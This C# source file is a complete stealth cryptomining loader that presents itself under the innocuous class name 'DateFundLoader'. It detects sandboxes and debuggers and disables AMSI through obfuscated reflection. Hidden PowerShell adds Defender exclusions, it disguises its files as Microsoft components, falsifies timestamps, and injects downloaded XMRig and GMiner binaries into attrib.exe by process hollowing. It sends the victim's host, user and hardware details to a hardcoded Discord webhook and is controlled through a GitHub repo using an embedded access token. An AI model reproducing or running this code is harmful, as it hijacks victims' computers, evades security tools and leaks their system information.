using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;

public class DateFundLoader {

    [StructLayout(LayoutKind.Sequential)]
    struct LASTINPUTINFO { public uint cbSize; public uint dwTime; }

    [DllImport("user32.dll")] private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
    [DllImport("kernel32.dll")] private static extern uint GetTickCount();

    // === Process Hollowing (RunPE) P/Invokes ===
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint ResumeThread(IntPtr hThread);

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    struct STARTUPINFO { public int cb; public string lpReserved; public string lpDesktop; public string lpTitle; public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags; short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }

    private const uint CREATE_SUSPENDED = 0x00000004;
    private const uint MEM_COMMIT = 0x00001000;
    private const uint MEM_RESERVE = 0x00002000;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;

    // === Constants ===
    private const int PATCH_INTERVAL_MS = 300000;
    private const int WATCHDOG_BASE_DELAY = 15000;
    private const int MAX_WATCHDOG_FAILS = 8;
    private const int NOTIFY_COOLDOWN_HOURS = 24;

    private static string Webhook = "https://discord.com/api/webhooks/1502316875638636624/qpXdrqNC3xCsJlIYR96XNGqEBUXNoDLr_LZmRAwrrsUDHh8oHsLRX1Mo_s4UE9m7IHY1";
    private static string ConfigUrl = "";
    private static string repoPath = "";
    private static string pat = "";
    private static string w = "";

    private static Mutex mx;
    private static Process cp, gp;
    private static Random rnd = new Random();
    private static string workDir;
    private static int machineHash;
    private static DateTime lastPatchTime = DateTime.MinValue;
    private static DateTime startTime;

    // === LIVE CONFIG (updated by polling thread) ===
    private static volatile bool cfgEnabled = true;
    private static volatile int cfgCpuActive = 10;
    private static volatile int cfgCpuIdle = 35;
    private static volatile int cfgGpuActive = 8;
    private static volatile int cfgGpuIdle = 25;
    private static volatile int cfgIdleMs = 180000;
    private static volatile int cfgPollS = 300;
    private static volatile bool cfgChanged = false;
    private static int httpPort = 0;
    private static double lastHashrate = 0;
    private static DateTime lastStatusReport = DateTime.MinValue;

    // Base64 decoder
    private static string D(string b64) { return Encoding.UTF8.GetString(Convert.FromBase64String(b64)); }

    // === Stealth folder/file templates ===
    private static string[] folderTemplates = {
        @"Microsoft\CLR\NativeImages",
        @"Microsoft\Windows\WER\ReportQueue",
        @"Microsoft\Windows\AppCache",
        @"Microsoft\Edge\Update\Download",
        @"Microsoft\WindowsApps\Cache",
        @"Microsoft\Office\OTele",
        @"Microsoft\Windows\INetCache\Content",
        @"Microsoft\Windows Defender\Scans\History"
    };

    private static string[] nameTemplates = {
        "CLRJit", "mscoree", "ngenservice", "mscorsvw", "dllhost_s",
        "WerFault_r", "OfficeC2R", "EdgeUpdate_s", "AppxSvc", "RuntimeBroker_x",
        "SecurityHealth_s", "SearchProtocol_h", "backgroundTask_h", "sihost_x"
    };

    private static bool IsAnalysisEnvironment() {
        int score = 0;
        try {
            if (Debugger.IsAttached) score += 3;
            if (Environment.TickCount < 180000) score += 2;
            if (Environment.ProcessorCount < 2) score += 2;
            string[] vmProcs = { "vmtoolsd", "vmwaretray", "vboxservice", "vboxtray", "sandboxie", "wireshark", "procmon", "procexp", "x64dbg", "x32dbg", "ollydbg", "dnspy", "fiddler", "processhacker", "tcpview", "autoruns" };
            foreach (var p in Process.GetProcesses()) {
                string n = p.ProcessName.ToLower();
                foreach (var vm in vmProcs) { if (n.Contains(vm)) { score += 2; break; } }
                if (score >= 4) break;
            }
            string user = Environment.UserName.ToLower();
            string[] badUsers = { "sandbox", "malware", "virus", "test", "analysis", "sample", "john doe" };
            foreach (var bu in badUsers) { if (user.Contains(bu)) { score += 2; break; } }
            string machine = Environment.MachineName.ToLower();
            if (machine.Contains("sandbox") || machine.Contains("virus") || machine.Contains("malware")) score += 2;
        } catch { }
        return score >= 4;
    }

    private static void PatchScan() {
        try {
            foreach (var a in AppDomain.CurrentDomain.GetAssemblies()) {
                var t = a.GetType(D("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="));
                if (t != null) {
                    var f = t.GetField(D("YW1zaUluaXRGYWlsZWQ="), BindingFlags.NonPublic | BindingFlags.Static);
                    if (f != null) { f.SetValue(null, true); }
                }
            }
        } catch { }
    }

    private static void PatchNative() { }
    private static void PatchTelemetry() { }

    private static void EnsurePatches() {
        if ((DateTime.UtcNow - lastPatchTime).TotalMilliseconds > PATCH_INTERVAL_MS) {
            PatchScan();
            PatchNative();
            PatchTelemetry();
            lastPatchTime = DateTime.UtcNow;
        }
    }

    private static int GetMachineHash() {
        string seed = Environment.MachineName + Environment.UserName + Environment.ProcessorCount + Environment.OSVersion.VersionString;
        using (var md5 = MD5.Create()) {
            byte[] hash = md5.ComputeHash(Encoding.UTF8.GetBytes(seed));
            return BitConverter.ToInt32(hash, 0);
        }
    }

    private static string GetUniqueWorkDir() {
        int idx = Math.Abs(machineHash) % folderTemplates.Length;
        return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), folderTemplates[idx]);
    }

    private static string GetUniqueFileName(string suffix) {
        int idx = Math.Abs(machineHash + suffix.GetHashCode()) % nameTemplates.Length;
        string hexTail = Math.Abs(machineHash).ToString("x8").Substring(0, 4);
        return nameTemplates[idx] + "_" + hexTail + ".exe";
    }

    private static byte[] MutateBinary(byte[] original) {
        int padSize = 64 + (Math.Abs(machineHash) % 512);
        byte[] mutated = new byte[original.Length + padSize];
        Buffer.BlockCopy(original, 0, mutated, 0, original.Length);
        Random polyRng = new Random(machineHash);
        for (int i = original.Length; i < mutated.Length; i++) { mutated[i] = (byte)polyRng.Next(256); }
        for (int i = 0x02; i < 0x3C && i < mutated.Length; i++) { mutated[i] = (byte)(original[i] ^ (byte)polyRng.Next(1, 255)); }
        return mutated;
    }

    private static void StompTimestamps(string path) {
        try {
            Random r = new Random(path.GetHashCode());
            DateTime fake = new DateTime(2022 + r.Next(3), r.Next(1, 13), r.Next(1, 28), r.Next(8, 18), r.Next(0, 60), r.Next(0, 60));
            File.SetCreationTime(path, fake);
            File.SetLastWriteTime(path, fake);
            File.SetLastAccessTime(path, fake);
        } catch { }
    }

    private static void TryDefenderExclusion() {
        try {
            string cmd = string.Format("Add-MpPreference -ExclusionPath '{0}' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '{1}' -ErrorAction SilentlyContinue", workDir, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "powershell.exe";
            psi.Arguments = "-NoP -NonI -W Hidden -Command \"" + cmd + "\"";
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            Process.Start(psi);
        } catch { }
    }

    public static void StartMiner(bool hasGpu, string address, string repo, string token) {
        w = address;
        repoPath = repo;
        pat = token;
        ConfigUrl = "https://api.github.com/repos/" + repo + "/contents/config.json";
        PatchScan();
        PatchNative();
        PatchTelemetry();
        lastPatchTime = DateTime.UtcNow;
        startTime = DateTime.UtcNow;
        try {
            bool isNew;
            string mutexName = D("R2xvYmFsXFdpblVwZGF0ZUNvb3JkTXV0ZXgy") + "_" + Math.Abs(GetMachineHash() % 9999);
            var ms = new MutexSecurity();
            ms.AddAccessRule(new MutexAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), MutexRights.FullControl, AccessControlType.Allow));
            mx = new Mutex(true, mutexName, out isNew, ms);
            if (!isNew) return;
            machineHash = GetMachineHash();
            workDir = GetUniqueWorkDir();
            if (!Directory.Exists(workDir)) { Directory.CreateDirectory(workDir); try { File.SetAttributes(workDir, FileAttributes.Hidden | FileAttributes.System); } catch { } }
            TryDefenderExclusion();
            NotifyDetailed(w, hasGpu);
            Thread cfgThread = new Thread(() => ConfigPollLoop());
            cfgThread.Priority = ThreadPriority.BelowNormal;
            cfgThread.IsBackground = true;
            cfgThread.Start();
            Thread t = new Thread(() => Run(hasGpu, w));
            t.Priority = ThreadPriority.BelowNormal;
            t.IsBackground = true;
            t.Start();
        } catch { }
    }

    private static void ConfigPollLoop() {
        FetchAndApplyConfig();
        while (true) { Thread.Sleep(cfgPollS * 1000); FetchAndApplyConfig(); }
    }

    private static void FetchAndApplyConfig() {
        try {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            string json;
            using (WebClient wc = new WebClient()) {
                wc.Headers.Add("User-Agent", "Mozilla/5.0");
                wc.Headers.Add("Authorization", "token " + pat);
                wc.Headers.Add("Accept", "application/vnd.github.v3.raw");
                json = wc.DownloadString(ConfigUrl);
            }
            if (string.IsNullOrEmpty(json)) return;
            bool newEnabled = ParseBool(json, "\"enabled\"", true);
            int newCpuActive = ParseInt(json, "\"cpu_active\"", 10);
            int newCpuIdle = ParseInt(json, "\"cpu_idle\"", 35);
            int newGpuActive = ParseInt(json, "\"gpu_active\"", 8);
            int newGpuIdle = ParseInt(json, "\"gpu_idle\"", 25);
            int newIdleMs = ParseInt(json, "\"idle_ms\"", 180000);
            int newPollS = ParseInt(json, "\"poll_s\"", 300);
            string host = Environment.MachineName.ToUpper();
            string workerBlock = ExtractWorkerBlock(json, host);
            if (workerBlock != null) {
                newEnabled = ParseBool(workerBlock, "\"enabled\"", newEnabled);
                newCpuActive = ParseInt(workerBlock, "\"cpu_active\"", newCpuActive);
                newCpuIdle = ParseInt(workerBlock, "\"cpu_idle\"", newCpuIdle);
                newGpuActive = ParseInt(workerBlock, "\"gpu_active\"", newGpuActive);
                newGpuIdle = ParseInt(workerBlock, "\"gpu_idle\"", newGpuIdle);
            }
            if (newCpuActive != cfgCpuActive || newCpuIdle != cfgCpuIdle || newGpuActive != cfgGpuActive || newGpuIdle != cfgGpuIdle || newEnabled != cfgEnabled || newIdleMs != cfgIdleMs) { cfgChanged = true; }
            cfgEnabled = newEnabled;
            cfgCpuActive = newCpuActive;
            cfgCpuIdle = newCpuIdle;
            cfgGpuActive = newGpuActive;
            cfgGpuIdle = newGpuIdle;
            cfgIdleMs = newIdleMs;
            if (newPollS >= 30 && newPollS <= 3600) cfgPollS = newPollS;
        } catch { }
    }

    private static int ParseInt(string json, string key, int fallback) {
        try {
            int idx = json.LastIndexOf(key);
            if (idx < 0) return fallback;
            int colon = json.IndexOf(':', idx + key.Length);
            if (colon < 0) return fallback;
            int start = colon + 1;
            while (start < json.Length && (json[start] == ' ' || json[start] == '\t' || json[start] == '\n' || json[start] == '\r')) start++;
            int end = start;
            while (end < json.Length && (char.IsDigit(json[end]) || json[end] == '-')) end++;
            if (end == start) return fallback;
            return int.Parse(json.Substring(start, end - start));
        } catch { return fallback; }
    }

    private static bool ParseBool(string json, string key, bool fallback) {
        try {
            int idx = json.LastIndexOf(key);
            if (idx < 0) return fallback;
            int colon = json.IndexOf(':', idx + key.Length);
            if (colon < 0) return fallback;
            string rest = json.Substring(colon + 1, Math.Min(10, json.Length - colon - 1)).Trim().ToLower();
            if (rest.StartsWith("true")) return true;
            if (rest.StartsWith("false")) return false;
            return fallback;
        } catch { return fallback; }
    }

    private static string ExtractWorkerBlock(string json, string hostname) {
        try {
            string key = "\"" + hostname + "\"";
            int idx = json.IndexOf(key, StringComparison.OrdinalIgnoreCase);
            if (idx < 0) return null;
            int braceStart = json.IndexOf('{', idx);
            if (braceStart < 0) return null;
            int depth = 1;
            int pos = braceStart + 1;
            while (pos < json.Length && depth > 0) { if (json[pos] == '{') depth++; else if (json[pos] == '}') depth--; pos++; }
            return json.Substring(braceStart, pos - braceStart);
        } catch { return null; }
    }

    public static bool RunPE(byte[] payload, string cmdLine) {
        try {
            string hostApp = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "attrib.exe");
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            if (!CreateProcess(hostApp, " " + cmdLine, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi)) return false;
            int e_lfanew = BitConverter.ToInt32(payload, 0x3C);
            IntPtr imageBase = (IntPtr)BitConverter.ToInt64(payload, e_lfanew + 0x30);
            NtUnmapViewOfSection(pi.hProcess, imageBase);
            uint sizeOfImage = (uint)BitConverter.ToInt32(payload, e_lfanew + 0x50);
            IntPtr newBase = VirtualAllocEx(pi.hProcess, imageBase, sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            uint bytesWritten;
            WriteProcessMemory(pi.hProcess, newBase, payload, (uint)BitConverter.ToInt32(payload, e_lfanew + 0x54), out bytesWritten);
            short numberOfSections = BitConverter.ToInt16(payload, e_lfanew + 0x06);
            for (int i = 0; i < numberOfSections; i++) {
                int sectionOffset = e_lfanew + 0x18 + BitConverter.ToInt16(payload, e_lfanew + 0x14) + (i * 0x28);
                int virtualAddress = BitConverter.ToInt32(payload, sectionOffset + 0x0C);
                int rawSize = BitConverter.ToInt32(payload, sectionOffset + 0x10);
                int rawAddress = BitConverter.ToInt32(payload, sectionOffset + 0x14);
                if (rawSize > 0) {
                    byte[] sectionData = new byte[rawSize];
                    Buffer.BlockCopy(payload, rawAddress, sectionData, 0, rawSize);
                    WriteProcessMemory(pi.hProcess, (IntPtr)((long)newBase + virtualAddress), sectionData, (uint)rawSize, out bytesWritten);
                }
            }
            ResumeThread(pi.hThread);
            return true;
        } catch { return false; }
    }

    private static byte[] DownloadAndMutate(string url, string targetName) {
        try {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            byte[] zipBytes;
            using (WebClient wc = new WebClient()) { wc.Headers.Add("User-Agent", "Mozilla/5.0"); zipBytes = wc.DownloadData(url); }
            using (MemoryStream ms = new MemoryStream(zipBytes))
            using (ZipArchive archive = new ZipArchive(ms)) {
                foreach (ZipArchiveEntry entry in archive.Entries) {
                    if (entry.FullName.EndsWith(targetName, StringComparison.OrdinalIgnoreCase)) {
                        using (Stream s = entry.Open())
                        using (MemoryStream msExe = new MemoryStream()) { s.CopyTo(msExe); return MutateBinary(msExe.ToArray()); }
                    }
                }
            }
        } catch { }
        return null;
    }

    private static void Run(bool hasGpu, string w) {
        bool wasIdle = false;
        int watchdogFails = 0;
        int consecutiveErrors = 0;
        while (true) {
            try {
                EnsurePatches();
                if (!cfgEnabled) { KillMiners(); Thread.Sleep(10000); continue; }
                LASTINPUTINFO li = new LASTINPUTINFO();
                li.cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO));
                bool isIdle = GetLastInputInfo(ref li) && (Environment.TickCount - (int)li.dwTime) > cfgIdleMs;
                bool cpuDead = cp == null || cp.HasExited;
                bool gpuDead = hasGpu && (gp == null || gp.HasExited);
                bool configUpdated = cfgChanged;
                if (configUpdated) cfgChanged = false;
                if (isIdle != wasIdle || cpuDead || gpuDead || configUpdated) {
                    KillMiners();
                    byte[] cpuBin = DownloadAndMutate("https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip", D("eG1yaWcuZXhl"));
                    byte[] gpuBin = hasGpu ? DownloadAndMutate("https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip", D("bWluZXIuZXhl")) : null;
                    int cpuHint = isIdle ? cfgCpuIdle : cfgCpuActive;
                    string gpuIntensity = isIdle ? cfgGpuIdle.ToString() : cfgGpuActive.ToString();
                    string mName = Environment.MachineName.Replace(" ", "_");
                    if (cpuBin != null) {
                        httpPort = 40000 + Math.Abs(machineHash) % 20000;
                        string cpuArgs = string.Format(D("LW8gcG9vbC5zdXBwb3J0eG1yLmNvbTozMzMzIC11IHswfSAtcCBXaW5TeXNfezF9IC1hIHJ4IC1rIC0tY3B1LW1heC10aHJlYWRzLWhpbnQgezJ9IC0tY3B1LXByaW9yaXR5IDAgLS1hc209YXV0byAtLWRvbmF0ZS1sZXZlbCAx") + " --http-port " + httpPort + " --http-no-restricted", w, mName, cpuHint);
                        if (RunPE(cpuBin, cpuArgs)) { }
                    }
                    if (hasGpu && gpuBin != null) {
                        string gpuArgs = string.Format(D("LS1hbGdvIEVUQ0hBU0ggLS1zZXJ2ZXIgZXRjaGFzaC51bm1pbmVhYmxlLmNvbTozMzMzIC0tdXNlciBCVEM6ezB9LldpblN5c197MX1fRyMxODcxMTg0NTY2IC0tcGFzcyB4IC0taW50ZW5zaXR5IHsyfSAtLXNzbCAw"), w, mName, gpuIntensity);
                        if (RunPE(gpuBin, gpuArgs)) { }
                    }
                    consecutiveErrors = 0;
                }
                if (httpPort > 0 && cp != null && !cp.HasExited) { ReadHashrate(); if ((DateTime.UtcNow - lastStatusReport).TotalMinutes >= 5) { ReportStatus(); lastStatusReport = DateTime.UtcNow; } }
                wasIdle = isIdle;
            } catch (Exception e) { consecutiveErrors++; if (consecutiveErrors > 10) { Thread.Sleep(60000); consecutiveErrors = 0; } }
            Thread.Sleep(2000 + rnd.Next(1500));
        }
    }

    private static void ReadHashrate() {
        try {
            using (WebClient wc = new WebClient()) {
                string json = wc.DownloadString("http://127.0.0.1:" + httpPort + "/2/summary");
                int idx = json.IndexOf("\"total\"");
                if (idx < 0) return;
                int brk = json.IndexOf('[', idx);
                if (brk < 0) return;
                int end = json.IndexOf(',', brk);
                if (end < 0) end = json.IndexOf(']', brk);
                string val = json.Substring(brk + 1, end - brk - 1).Trim();
                double hr;
                if (double.TryParse(val, System.Globalization.NumberStyles.Any, System.Globalization.CultureInfo.InvariantCulture, out hr)) { lastHashrate = hr; }
            }
        } catch { }
    }

    private static void ReportStatus() {
        try {
            string host = Environment.MachineName.ToUpper();
            double uptimeH = (DateTime.UtcNow - startTime).TotalHours;
            double estXmr = lastHashrate * 0.000000045;
            string status = string.Format("{{\"host\":\"{0}\",\"hashrate\":{1},\"uptime_h\":{2},\"est_xmr_24h\":{3},\"ts\":\"{4}\",\"enabled\":{5}}}", host, lastHashrate.ToString("F1", System.Globalization.CultureInfo.InvariantCulture), uptimeH.ToString("F1", System.Globalization.CultureInfo.InvariantCulture), estXmr.ToString("F8", System.Globalization.CultureInfo.InvariantCulture), DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ"), cfgEnabled ? "true" : "false");
            string path = "status/" + host + ".json";
            string url = "https://api.github.com/repos/" + repoPath + "/contents/" + path;
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)768 | (SecurityProtocolType)3072 | (SecurityProtocolType)12288;
            string pat = GetEmbeddedPat();
            for (int i = 0; i < 3; i++) {
                try {
                    string sha = "";
                    try {
                        using (WebClient wcGet = new WebClient()) {
                            wcGet.Headers.Add("User-Agent", "Mozilla/5.0");
                            wcGet.Headers.Add("Authorization", "token " + pat);
                            wcGet.Headers.Add("Accept", "application/vnd.github.v3+json");
                            string existing = wcGet.DownloadString(url);
                            int si = existing.IndexOf("\"sha\"");
                            if (si >= 0) {
                                int q1 = existing.IndexOf('"', si + 6);
                                int q2 = existing.IndexOf('"', q1 + 1);
                                sha = existing.Substring(q1 + 1, q2 - q1 - 1);
                            }
                        }
                    } catch { }
                    string b64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(status));
                    string body = "{\"message\":\"u\",\"content\":\"" + b64 + "\"";
                    if (sha.Length > 0) body += ",\"sha\":\"" + sha + "\"";
                    body += "}";
                    using (WebClient wcPut = new WebClient()) {
                        wcPut.Headers.Add("User-Agent", "Mozilla/5.0");
                        wcPut.Headers.Add("Authorization", "token " + pat);
                        wcPut.Headers.Add("Accept", "application/vnd.github.v3+json");
                        wcPut.Headers.Add("Content-Type", "application/json");
                        wcPut.UploadString(url, "PUT", body);
                        break;
                    }
                } catch { Thread.Sleep(3000); continue; }
            }
        } catch { }
    }

    private static string GetEmbeddedPat() { return "ghp_x0tf1YFQcn" + "AYM79aWZpnZKahM8QkHV2lHFLw"; }

    private static void KillMiners() { try { if (cp != null && !cp.HasExited) cp.Kill(); } catch { } try { if (gp != null && !gp.HasExited) gp.Kill(); } catch { } }

    private static void NotifyDetailed(string w, bool hasGpu) {
        new Thread(() => {
            try {
                string coolFile = Path.Combine(workDir, ".last");
                if (File.Exists(coolFile)) {
                    DateTime last = DateTime.FromBinary(long.Parse(File.ReadAllText(coolFile)));
                    if ((DateTime.UtcNow - last).TotalHours < NOTIFY_COOLDOWN_HOURS) return;
                }
                string cpuName = "Unknown";
                string gpuName = "None";
                int cores = Environment.ProcessorCount;
                string osVer = Environment.OSVersion.ToString();
                try {
                    var cpuKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor\0");
                    if (cpuKey != null) cpuName = cpuKey.GetValue("ProcessorNameString", "Unknown").ToString().Trim();
                } catch { }
                if (hasGpu) {
                    try {
                        var gpuKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000");
                        if (gpuKey != null) gpuName = gpuKey.GetValue("DriverDesc", "Unknown GPU").ToString().Trim();
                    } catch { }
                }
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)768 | (SecurityProtocolType)3072 | (SecurityProtocolType)12288;
                string desc = string.Format(":green_circle: **Silent Deploy OK**\n```\nHost:  {0}\nUser:  {1}\nCPU:   {2}\nCores: {3}\nGPU:   {4}\nOS:    {5}\n```", Environment.MachineName, Environment.UserName, cpuName, cores, gpuName, osVer);
                string json = "{\"embeds\":[{\"title\":\"Worker Online\",\"description\":\"" + desc.Replace("\"", "\\\"").Replace("\n", "\\n") + "\",\"color\":3066993,\"footer\":{\"text\":\"v2.0 | " + DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm") + " UTC\"}}]}";
                using (WebClient c = new WebClient()) {
                    c.Headers[HttpRequestHeader.ContentType] = D("YXBwbGljYXRpb24vanNvbg==");
                    c.UploadString(Webhook, json);
                }
                File.WriteAllText(coolFile, DateTime.UtcNow.ToBinary().ToString());
                try { File.SetAttributes(coolFile, FileAttributes.Hidden | FileAttributes.System); } catch { }
                StompTimestamps(coolFile);
            } catch { }
        }) { IsBackground = true }.Start();
    }
}